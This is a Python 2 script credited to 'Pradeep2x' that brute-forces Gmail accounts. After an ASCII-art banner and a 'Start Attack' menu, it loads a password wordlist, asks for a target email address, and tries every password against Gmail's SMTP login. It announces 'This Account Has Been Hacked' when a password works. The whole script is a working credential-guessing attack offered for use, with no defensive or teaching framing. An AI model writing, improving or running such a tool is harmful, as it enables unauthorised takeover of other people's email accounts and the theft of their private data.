#!/usr/bin/python
'''created by Pradeep2x'''

import smtplib
from os import system

def main():
   print '================================================='
   print '               Pradeep2x                         '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '          Pradeep2x                '             '
   print '      |\             //            '
   print '       \\           _!_            '
   print '        \\         /___\           '
   print '         \\        [+++]           '
   print '          \\    _ _\^^^/_ _        '
   print '           \\/ (    '-'  ( )       '
   print '           /( \/ |  {&}  /\ \      '
   print '             \  / \     / _> )     '
   print '              "`   >:::;-'`""'-.   '
   print '      2xHack      /:::/         \  '
   print '                 /  /||   {&}    | '
   print '                (  / (\         /  '
   print '                / /   \'-.___.-'   '
   print '              _/ /     \ \         '
   print '             /___|    /___|        '


main()
print '[1] Start Attack'
print '[2] Exit'
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
